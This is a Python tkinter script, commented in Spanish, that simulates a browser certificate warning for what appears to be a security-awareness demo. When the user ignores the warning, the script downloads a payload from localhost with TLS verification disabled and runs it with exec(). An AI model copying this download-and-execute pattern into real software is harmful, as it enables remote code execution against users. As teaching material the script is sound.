import tkinter as tk
from tkinter import messagebox
import requests
from requests.packages.urllib3.exceptions import InsecureRequestWarning
import warnings
import sys
from io import StringIO
import contextlib

# Configuración
URL_OBJETIVO = "https://localhost:4443/payload.txt"

class BrowserSimulado:
    def __init__(self, root):
        self.root = root
        self.root.title("Navegador Seguro - Simulación")
        self.root.geometry("600x400")
        
        # Barra de direcciones (Estética)
        barra_frame = tk.Frame(root, bg="#f0f0f0", pady=5)
        barra_frame.pack(fill="x")
        tk.Label(barra_frame, text="URL:", bg="#f0f0f0").pack(side="left", padx=5)
        self.url_entry = tk.Entry(barra_frame, width=50)
        self.url_entry.insert(0, URL_OBJETIVO)
        self.url_entry.config(state="readonly") # Solo lectura
        self.url_entry.pack(side="left", padx=5)
        
        # Área de contenido principal
        self.content_frame = tk.Frame(root, bg="white")
        self.content_frame.pack(fill="both", expand=True)

        # Iniciar intento de conexión automáticamente
        self.intentar_conexion_segura()

    def intentar_conexion_segura(self):
        try:
            # 1. Intento legítimo (Verificando certificado)
            requests.get(URL_OBJETIVO, verify=True)
            
            # Si conecta (no debería pasar con cert falso), mostramos éxito
            self.mostrar_pagina_exito()
            
        except requests.exceptions.SSLError:
            # 2. Si falla el certificado, mostramos la ALERTA
            self.mostrar_alerta_seguridad()
            
        except requests.exceptions.ConnectionError:
            self.mostrar_error_conexion()

    def mostrar_alerta_seguridad(self):
        # Limpiar frame
        for widget in self.content_frame.winfo_children():
            widget.destroy()
            
        # Fondo rojo de alerta
        self.content_frame.config(bg="#d93025") # Rojo estilo Chrome
        
        tk.Label(self.content_frame, text="⚠️", font=("Arial", 40), bg="#d93025", fg="white").pack(pady=(40, 10))
        tk.Label(self.content_frame, text="La conexión no es privada", font=("Arial", 18, "bold"), bg="#d93025", fg="white").pack()
        
        msg = ("Es posible que unos atacantes estén intentando robar tu información \n"
               "de localhost (por ejemplo, contraseñas, mensajes o tarjetas de crédito).")
        tk.Label(self.content_frame, text=msg, bg="#d93025", fg="white", justify="center").pack(pady=10)
        
        # Botón para ignorar advertencia
        btn_ignorar = tk.Button(self.content_frame, text="Configuración avanzada (Inseguro)", 
                                command=self.mostrar_opcion_riesgo, bg="white", fg="#d93025")
        btn_ignorar.pack(pady=20)

    def mostrar_opcion_riesgo(self):
        # Añade el enlace final para proceder
        tk.Label(self.content_frame, text="El certificado no es válido.", bg="#d93025", fg="#ffcccc").pack()
        
        link = tk.Button(self.content_frame, text="Proceder a localhost (no seguro)", 
                         font=("Arial", 9, "underline"),
                         command=self.ejecutar_ataque, 
                         bg="#d93025", fg="white", bd=0, activebackground="#d93025")
        link.pack(pady=5)

    def ejecutar_ataque(self):
        # 3. Conexión ignorando advertencia
        warnings.simplefilter('ignore', InsecureRequestWarning)
        
        try:
            response = requests.get(URL_OBJETIVO, verify=False)
            
            if response.status_code == 200:
                contenido_malicioso = response.content.decode('utf-8-sig')
                
                # 4. Simulación de ejecución
                # Capturamos lo que el "virus" imprime para mostrarlo en una ventana
                f = StringIO()
                with contextlib.redirect_stdout(f):
                    try:
                        exec(contenido_malicioso)
                    except Exception as e:
                        print(f"Error ejecutando payload: {e}")
                
                resultado_virus = f.getvalue()
                
                messagebox.showwarning("¡INFECTADO!", f"Has ignorado la advertencia.\n\nEl servidor ejecutó:\n{resultado_virus}")
                self.root.destroy() # Cierra el navegador simulado
            else:
                messagebox.showerror("Error", "No se pudo descargar el payload.")
                
        except Exception as e:
            messagebox.showerror("Error", f"Fallo en la conexión: {e}")

    def mostrar_error_conexion(self):
        tk.Label(self.content_frame, text="No se puede conectar al servidor.\n¿Ejecutaste 'servidor.py'?", font=("Arial", 14)).pack(pady=50)

    def mostrar_pagina_exito(self):
        tk.Label(self.content_frame, text="Conexión Segura Establecida", fg="green", font=("Arial", 16)).pack(pady=50)

if __name__ == "__main__":
    root = tk.Tk()
    app = BrowserSimulado(root)
    root.mainloop()